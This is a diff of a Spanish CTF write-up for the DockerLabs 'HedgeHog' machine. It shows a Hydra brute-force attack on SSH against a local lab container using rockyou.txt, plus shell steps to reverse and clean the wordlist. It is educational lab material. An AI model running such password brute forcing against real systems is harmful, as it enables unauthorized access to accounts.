@@ -96,9 +96,9 @@ Al igual que antes, para que la visualización de toda la información sea más 
 En el puerto 22 nos encontramos con un servicio *OpenSSH* actualizado a una versión relativamente reciente, lo que indica que no presenta ninguna vulnerabilidad conocida (versiones < 7.7) por lo que nos centraremos primero en el servicio HTTP del puerto 80.  Para ello nos dirigiremos al navegador y escribiremos la dirección IP. 
 
 ![Mensaje](https://github.com/JavieRR13/WriteUps/blob/70493b2edc4bdf17463586f8e449dda90b448450/DockerLabs/Muy%20f%C3%A1cil/HedgeHog/Im%C3%A1genes/HedgeHog_Mensaje.png)
-En la web solo nos encontramos con este mensaje.  Inspeccionando un poco el código fuente de la página tampoco parece haber nada.  Lo único que nos queda es asumir que es un usuario válido en SSH y probarlo con un ataque de fuerza bruta utilizando [Hydra](https://github.com/vanhauser-thc/thc-hydra) usando "tails" como nombre de usuario y el diccionario "rockyou.txt" para comprobar contraseñas.
+En la web solo nos encontramos con este mensaje.  Inspeccionando un poco el código fuente de la página tampoco parece haber nada.  Lo único que nos queda es asumir que es un usuario válido en SSH y probarlo con un ataque de fuerza bruta utilizando [Hydra](https://github.com/vanhauser-thc/thc-hydra) usando "tails" como nombre de usuario y el diccionario [rockyou.txt](https://github.com/topics/rockyou-wordlist) para comprobar contraseñas.
 ```ruby
-hydra -l tails -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
+> hydra -l tails -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 22:56:22
@@ -107,11 +107,54 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-08 22:56:
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
 [DATA] attacking ssh://172.17.0.2:22/
 [STATUS] 252.00 tries/min, 252 tries in 00:01h, 14344148 to do in 948:42h, 15 active
+[STATUS] 245.00 tries/min, 735 tries in 00:03h, 14343665 to do in 975:46h, 15 active
+[STATUS] 237.14 tries/min, 1660 tries in 00:07h, 14342740 to do in 1008:02h, 15 active
+[STATUS] 233.93 tries/min, 3509 tries in 00:15h, 14340891 to do in 1021:44h, 15 active
 ```
-Tras 10 minutos de espera y, sin ninguna respueta, empiezo a plantearme que algo estoy haciendo mal.
+* Con -l seleccionamos el usuario.
+* Con -P indicamos un conjunto de contraseñas a probar, en este caso, las recogidas en el diccionario.
+* Por último indicamos el servicio y la dirección sobre la que ejecutar el ataque.
+
+Después 10 minutos de espera y, sin ninguna respueta, asumo que hay algo mal en mi planteamiento y decido usar otros diccionarios e incluso usar "tails" como contraseña y buscar por usuarios.  Tras mucho tiempo de pruebas y, viendo el nombre de la máquina (tail = cola), que además es un comando propio de Linux, decido invertir el diccionario [rockyou.txt](https://github.com/topics/rockyou-wordlist) para que comience la explotación por la última palabra del diccionario en el buen orden. 
+```ruby
+❯ touch rockyou_invertido.txt
+❯ chmod 644 rockyou_invertido.txt
+❯ tac /usr/share/wordlists/rockyou.txt > rockyou_invertido.txt
+❯ head rockyou_invertido.txt
+*7¡Vamos!
+a6_123
+abygurl69
+ie168
+▒xCvBnM,
+           
+            
+                  
+       1
+       1234567
+❯ sed -i 's/ //g' rockyou_invertido.txt                                                                                                                                                                                       ❯ head rockyou_invertido.txt
+*7¡Vamos!
+a6_123
+abygurl69
+ie168
+▒xCvBnM,
 
 
 
+1
+1234567
+```
+* Con touch creamos en el directorio actual (en mi caso ~/Desktop/Maquinas/DockerLabs/Hedgehod/scripts) un archivo de texto plano vacio llamado *rockyou_invertido.txt*
+* Con chmod 644 le damos los permisos necesarios.
+* Con tac invertimos el diccionario rockyou.txt en el archivo rockyou_invertido.txt ya creado y con los permisos necesarios.
+* Con head comprobaremos si se ha escrito bien. ¡COSA QUE NO HA PASADO!  Se ha copiado con espacios y saltos de línea.
+* Para ello:
+  * sed es un editor de flujo que permite buscar, reemplazar, eliminar o modificar texto línea por línea en un archivo o en la entrada estándar.
+  * Con -i vamos a indicarle que la modificación la haga en el propio archivo, porque por defecto sed solo lo muestra por pantalla pero no lo modifica.
+  * Con s indicamos que queremos sustituir.
+  * Con el espacio entre / / indicamos que serán los espacios en blanco.
+  * Con g indicaremos que queremos que se haga de manera global, en todas las líneas.
+
+Una vez teniendo listo el diccionario lo probaremos otra vez con [Hydra](https://github.com/vanhauser-thc/thc-hydra) a ver si esta vez encontramos algo rápido.
 
 
 
